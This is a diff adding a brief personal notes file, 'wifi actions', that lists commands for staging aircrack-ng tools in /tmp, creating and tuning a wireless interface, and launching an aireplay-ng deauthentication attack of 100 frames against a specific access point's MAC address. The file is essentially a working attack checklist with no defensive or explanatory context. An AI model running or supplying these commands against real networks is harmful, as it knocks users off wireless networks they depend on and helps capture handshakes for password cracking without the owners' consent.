@@ -1,0 +1,9 @@
+wifi actions
+
+install aircrack-ng in /tmp
+copy aireplay-ng and libs (ldd)
+- turn off wifi
+iw phy phy0 interface add wlan type managed
+ifconfig wlan0 up
+iw dev wlan0 set channel 11
+aireplay-ng -0 100 -a 00:90:96:F8:3B:27 wlan0
